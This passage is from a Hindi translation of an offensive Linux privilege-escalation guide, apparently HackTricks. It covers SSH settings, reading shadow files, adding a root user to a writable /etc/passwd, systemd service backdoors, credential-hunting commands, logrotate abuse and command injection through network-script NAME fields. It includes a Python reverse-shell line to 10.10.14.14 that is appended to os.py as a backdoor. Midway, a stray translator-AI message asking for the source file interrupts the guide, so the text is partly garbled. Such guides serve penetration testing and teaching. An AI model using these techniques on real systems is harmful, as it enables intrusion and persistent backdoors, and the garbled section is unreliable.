- `yes`: root पासवर्ड और private key दोनों का उपयोग करके login कर सकता है
- `without-password` or `prohibit-password`: root केवल private key के साथ ही login कर सकता है
- `forced-commands-only`: root केवल private key का उपयोग करके और तभी login कर सकता है जब commands विकल्प निर्दिष्ट हों
- `no` : नहीं

### AuthorizedKeysFile

यह उन फाइलों को निर्दिष्ट करता है जिनमें उपयोगकर्ता authentication के लिए उपयोग की जाने वाली public keys होती हैं। यह `%h` जैसे tokens रख सकती है, जो home directory से बदल दिए जाएंगे। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको अनुमति देता है कि आप **अपने स्थानीय SSH keys का उपयोग करें बजाय इसके कि आप बिना passphrases के keys अपने server पर छोड़ दें**। इससे आप ssh के माध्यम से **jump** करके **किसी host पर** जा सकेंगे और वहाँ से **दूसरे host पर jump** कर सकेंगे **का उपयोग करके** उस **key** का जो आपके **initial host** में स्थित है।
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है तो हर बार जब उपयोगकर्ता किसी अलग मशीन पर जाता/जाती है, उस होस्ट को keys तक पहुँच प्राप्त हो जाएगी (जो कि एक सुरक्षा समस्या है)।

The file `/etc/ssh_config` can **ओवरराइड** this **विकल्प** and allow or denied this configuration.\
फ़ाइल `/etc/sshd_config` `AllowAgentForwarding` कीवर्ड के साथ ssh-agent forwarding को **अनुमति** या अस्वीकार कर सकती है (डिफ़ॉल्ट: अनुमति)।

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## रोचक फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

The file `/etc/profile` and the files under `/etc/profile.d/` are **स्क्रिप्ट्स जो तब निष्पादित होती हैं जब कोई उपयोगकर्ता नया shell चलाता/चलाती है**. Therefore, if you can **लिख या संशोधित कर सकते हैं तो आप escalate privileges कर सकते हैं**.
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिलता है तो आपको इसे **संवेदनशील विवरणों** के लिए जांचना चाहिए।

### Passwd/Shadow Files

OS पर निर्भर करके `/etc/passwd` और `/etc/shadow` फाइलों का नाम अलग हो सकता है या उनका कोई बैकअप मौजूद हो सकता है। इसलिए यह अनुशंसित है कि **सभी को ढूँढें** और **जांचें कि क्या आप उन्हें पढ़ सकते हैं** ताकि यह देखा जा सके **कि फाइलों के अंदर कोई hashes हैं या नहीं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप **password hashes** को `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

सबसे पहले, निम्नलिखित कमांडों में से किसी एक का उपयोग करके एक पासवर्ड बनाएं।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
कृपया src/linux-hardening/privilege-escalation/README.md की पूरी सामग्री भेजें ताकि मैं उसका हिंदी में अनुवाद कर सकूँ। 

मैं फाइल के अनुवाद में अंत में user `hacker` और एक उत्पन्न पासवर्ड जोड़ दूँगा, पर ध्यान दें कि मैं आपकी मशीन पर वास्तविक user नहीं बना सकता—मैं केवल टेक्स्ट/markdown में परिवर्तन कर के लौटाऊँगा। क्या आप पासवर्ड की लंबाई और उसमें symbols/numbers शामिल होने की प्राथमिकता बताना चाहेंगे?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `hacker:hacker` के साथ `su` कमांड का उपयोग कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड के एक डमी उपयोगकर्ता जोड़ने के लिए निम्न पंक्तियों का उपयोग कर सकते हैं.\
WARNING: आप मशीन की वर्तमान सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म पर `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होता है, साथ ही `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको यह जांचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **service configuration file** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर **tomcat** server चल रहा है और आप **modify the Tomcat service configuration file inside /etc/systemd/,** तो आप इन लाइनों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### फ़ोल्डरों की जाँच

निम्न फ़ोल्डरों में बैकअप या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप आखिरी को पढ़ न सकें, पर कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### ऐसी ज्ञात फाइलें जिनमें passwords होते हैं

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) के कोड को पढ़ें — यह उन **कई संभावित फ़ाइलों जिनमें passwords हो सकते हैं** की तलाश करता है।\
**एक और रोचक टूल** जिसे आप इसके लिए इस्तेमाल कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक open source application है जिसका उपयोग local computer पर Windows, Linux & Mac के लिए स्टोर किए गए बहुत सारे passwords को retrieve करने के लिए किया जाता है।

### लॉग्स

अगर आप logs पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अजीब लॉग होगा, वह उतना ही (शायद) अधिक दिलचस्प होगा।\
इसके अलावा, कुछ "**खराब**" कॉन्फ़िगर किए गए (backdoored?) **audit logs** आपको audit logs के अंदर **record passwords** करने की अनुमति दे सकते हैं जैसा कि इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
लॉग्स पढ़ने के लिए **समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) वास्तव में बहुत मददगार होगा।

### Shell फाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फाइलों की भी जाँच करनी चाहिए जिनके **नाम** में या उनके **कंटेंट** के अंदर शब्द "**password**" मौजूद हों, और लॉग्स में IPs और emails या hashes regexps भी चेक करें।\
मैं यहाँ यह सब कैसे करना है सूचीबद्ध नहीं कर रहा/रही हूँ, लेकिन अगर आप इच्छुक हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) द्वारा कौन से आख़िरी चेक किए जाते हैं।

## Writable files

### Python library hijacking

यदि आप जानते हैं कि कोई python स्क्रिप्ट किस **स्थान** से execute होने वाली है और आप उस फ़ोल्डर के अंदर **can write inside** कर सकते हैं या आप **modify python libraries** कर सकते हैं, तो आप OS लाइब्रेरी को modify करके उसमें backdoor डाल सकते हैं (यदि आप उस जगह लिख सकते हैं जहाँ python स्क्रिप्ट execute होने वाली है, os.py लाइब्रेरी को copy और paste कर लें)।

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate शोषण

`logrotate` में एक कमजोरी उन users को जिनके पास किसी log फ़ाइल या उसके parent डायरेक्टरीज़ पर **लिखने की अनुमति** है संभावित रूप से privileges escalate करने देती है। इसका कारण यह है कि `logrotate`, जो अक्सर `root` के रूप में चलता है, को arbitrary फ़ाइलें execute करने के लिए manipulate किया जा सकता है, खासकर उन डायरेक्टरीज़ में जैसे _**/etc/bash_completion.d/**_. यह ज़रूरी है कि permissions केवल _/var/log_ में ही नहीं बल्कि उन किसी भी डायरेक्टरी में भी चेक किए जाएँ जहाँ log rotation लागू होती है।

> [!TIP]
> यह कमजोरी `logrotate` version `3.18.0` और पुराने वर्शन को प्रभावित करती है

इस कमजोरी के बारे में अधिक विस्तृत जानकारी इस पेज पर पाई जा सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस कमजोरी का उपयोग [**logrotten**](https://github.com/whotwagner/logrotten) के साथ कर सकते हैं।

यह कमजोरी [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** के बहुत समान है, इसलिए जब भी आपको यह मिले कि आप logs को बदल सकते हैं, तो यह जाँचें कि कौन उन logs का प्रबंधन कर रहा है और देखें कि क्या आप logs को symlinks से बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी वजह से कोई user _/etc/sysconfig/network-scripts_ में `ifcf-<whatever>` स्क्रिप्ट **लिख** सके या किसी मौजूदा स्क्रिप्ट को **समायोजित** कर सके, तो आपका **system pwned** हो जाता है।

Network scripts, _ifcg-eth0_ उदाहरण के लिए नेटवर्क कनेक्शनों के लिए उपयोग होते हैं। वे बिल्कुल .INI फ़ाइलों जैसे दिखते हैं। हालाँकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा ~sourced~ किया जाता है।

मेरे मामले में, इन network स्क्रिप्ट्स में `NAME=` attribute ठीक से हैंडल नहीं किया जाता। यदि नाम में **white/blank space** है तो सिस्टम उस white/blank space के बाद वाले भाग को execute करने की कोशिश करता है। इसका मतलब है कि **पहली blank space के बाद सब कुछ root के रूप में executed होगा**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_नोट: Network और /bin/id_ के बीच खाली जगह पर ध्यान दें_)

### **init, init.d, systemd, and rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए स्क्रिप्ट्स का घर है, जो क्लासिक Linux सेवा प्रबंधन प्रणाली है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने के लिए स्क्रिप्ट्स शामिल होते हैं। इन्हें सीधे या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से चलाया जा सकता है। Redhat सिस्टम में वैकल्पिक पथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` Upstart से जुड़ा है, जो Ubuntu द्वारा प्रस्तुत एक नया service management है और service management कार्यों के लिए configuration फाइलों का उपयोग करता है। Upstart पर संक्रमण के बावजूद, Upstart की compatibility layer के कारण SysVinit स्क्रिप्ट्स अभी भी Upstart कॉन्फ़िगरेशन के साथ उपयोग किए जाते हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसी उन्नत सुविधाएँ प्रदान करता है। यह फ़ाइलों को डिस्ट्रिब्यूशन पैकेजों के लिए `/usr/lib/systemd/` और एडमिनिस्ट्रेटर संशोधनों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे सिस्टम प्रशासन प्रक्रिया सरल होती है।

## अन्य तरकीबें

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर privileged kernel functionality को userspace manager को एक्सपोज़ करने के लिए एक syscall को hook करते हैं। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager का impersonate करने और पहले से-rooted डिवाइसेज़ पर root तक escalate करने में सक्षम बना सकती है। और exploitation विवरण यहाँ जानें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## अधिक मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## संदर्भ

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
